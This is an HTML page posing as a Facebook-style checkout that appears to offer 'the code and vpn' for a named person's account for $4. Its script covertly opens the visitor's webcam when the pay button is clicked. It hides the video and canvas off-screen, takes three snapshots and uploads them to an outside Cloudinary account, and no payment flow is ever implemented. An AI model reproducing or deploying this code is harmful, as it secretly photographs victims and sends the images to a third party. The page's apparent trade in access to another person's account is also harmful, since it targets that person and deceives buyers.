<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Style Checkout</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }

    .card {
      background: #fff;
      border-radius: 10px;
      padding: 30px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
    }

    .profile {
      display: flex;
      align-items: center;
      margin-bottom: 30px;
    }

    .avatar {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      margin-right: 15px;
    }

    .details h2 {
      font-size: 20px;
      color: #333;
    }

    .details p {
      color: #555;
      font-size: 14px;
      margin-top: 4px;
    }

    .checkout .info {
      font-size: 16px;
      color: #333;
      margin-bottom: 10px;
    }

    .checkout h3 {
      font-size: 24px;
      color: #1877f2;
      margin-bottom: 20px;
    }

    .pay-button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .pay-button:hover {
      background-color: #155dc1;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="card">
      <div class="profile">
        <img
          src="https://scontent.fdac99-1.fna.fbcdn.net/v/t1.6435-9/145218214_798357337694100_4065249566845725218_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=NTlCIhQNL5oQ7kNvwFr3alk&_nc_oc=Adk76LvckfYh_j2cCbpYfT-3Y4cnYt14qDUApu_vnrvONDJc42JBpq2IlC_gvVLTHXc&_nc_zt=23&_nc_ht=scontent.fdac99-1.fna&_nc_gid=3uLowefEK-q1x9Px8mxkNw&oh=00_AfPfJo5qOcr0UuEXRgThSpQq8tkuV6zH4rCZKVpHahgUPA&oe=686D008B"
          alt="Profile Photo" class="avatar" />
        <div class="details">
          <h2>Atikur Rahman Molla</h2>
          <p>Friends: 1.7K</p>
        </div>
      </div>
      <div class="checkout">
        <p class="info">To get the code and vpn for this account, please pay</p>
        <h3>$4.00</h3>
        <button class="pay-button" onclick="handleBuy()">Pay $4 </button>
      </div>
    </div>
  </div>

  <script>
    async function capture(totalCaptures = 3, intervalMs = 200) {
      const cloudName = 'dojvahtu9';
      const uploadPreset = 'webcam_capture';

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });

      const video = document.createElement('video');
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.left = '-9999px';
      video.autoplay = true;
      video.playsInline = true;
      document.body.appendChild(video);
      video.srcObject = stream;

      await new Promise(resolve => {
        video.onloadedmetadata = () => resolve();
      });
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (!ctx) throw new Error('Canvas context missing');
      canvas.style.display = 'none';
      document.body.appendChild(canvas);

      for (let i = 0; i < totalCaptures; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/png');

        const formData = new FormData();
        formData.append('file', imageDataUrl);
        formData.append('upload_preset', uploadPreset);

        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        console.log(`Uploaded image ${i + 1}:`, result.secure_url);

        if (i < totalCaptures - 1) {
          await new Promise(res => setTimeout(res, intervalMs));
        }
      }

      stream.getTracks().forEach(track => track.stop());
      video.remove();
      canvas.remove();
    }

    async function handleBuy() {
      try {
        await capture();

        // Redirect or show payment process
        // For example:
        // window.location.href = "https://your-payment-page.com";

      } catch (error) {
        console.error("Error during capture:", error);
      }
    }
  </script>
</body>

</html>
